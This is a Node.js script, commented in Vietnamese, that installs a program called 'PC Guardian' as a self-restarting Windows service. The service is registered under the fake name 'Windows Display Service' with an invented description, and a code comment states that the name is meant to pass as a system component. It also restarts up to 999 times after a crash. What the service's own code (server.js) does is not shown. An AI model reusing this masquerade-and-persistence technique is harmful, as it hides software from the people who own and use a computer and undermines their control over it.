/**
 * Windows Service installer - Cài đặt PC Guardian như Windows Service
 * Service sẽ tự khởi động cùng Windows và tự restart khi bị crash
 * CẦN QUYỀN ADMINISTRATOR
 */
const path = require('path');
const Service = require('node-windows').Service;

const svcName = 'Windows Display Service'; // Tên giả trang hệ thống
const svcDescription = 'Manages display configuration and rendering services.';

const svc = new Service({
  name: svcName,
  description: svcDescription,
  script: path.join(__dirname, 'server.js'),
  nodeOptions: [],
  // Tự restart khi crash
  wait: 2,
  grow: 0.5,
  maxRestarts: 999
});

function installService() {
  return new Promise((resolve, reject) => {
    svc.on('install', () => {
      console.log('[✅] Service đã được cài đặt thành công!');
      console.log(`[ℹ️] Tên service: "${svcName}"`);
      console.log('[▶️] Đang khởi động service...');
      svc.start();
    });

    svc.on('start', () => {
      console.log('[✅] Service đang chạy!');
      console.log('[ℹ️] PC Guardian sẽ tự động chạy khi bật máy');
      console.log('[ℹ️] Service sẽ tự restart nếu bị crash');
      resolve();
    });

    svc.on('alreadyinstalled', () => {
      console.log('[ℹ️] Service đã được cài đặt trước đó');
      resolve();
    });

    svc.on('error', (err) => {
      console.error('[❌] Lỗi:', err);
      reject(err);
    });

    console.log('[⏳] Đang cài đặt Windows Service...');
    console.log('[⚠️] Cần quyền Administrator!');
    svc.install();
  });
}

function uninstallService() {
  return new Promise((resolve, reject) => {
    svc.on('uninstall', () => {
      console.log('[✅] Service đã được gỡ bỏ');
      resolve();
    });

    svc.on('error', (err) => {
      console.error('[❌] Lỗi:', err);
      reject(err);
    });

    console.log('[⏳] Đang gỡ bỏ Windows Service...');
    svc.stop();
    setTimeout(() => svc.uninstall(), 2000);
  });
}

function getServiceStatus() {
  return new Promise((resolve) => {
    const { exec } = require('child_process');
    exec(`sc query "${svcName}"`, (err, stdout) => {
      if (err || !stdout.includes('RUNNING')) {
        resolve('STOPPED');
      } else {
        resolve('RUNNING');
      }
    });
  });
}

// CLI interface
const action = process.argv[2];
if (action === 'install') {
  installService().catch(console.error);
} else if (action === 'uninstall') {
  uninstallService().catch(console.error);
} else if (action === 'status') {
  getServiceStatus().then(s => console.log(`Service status: ${s}`));
} else {
  console.log('Usage:');
  console.log('  node service-manager.js install     - Cài đặt service');
  console.log('  node service-manager.js uninstall   - Gỡ bỏ service');
  console.log('  node service-manager.js status      - Kiểm tra trạng thái');
}

module.exports = { installService, uninstallService, getServiceStatus, svc };
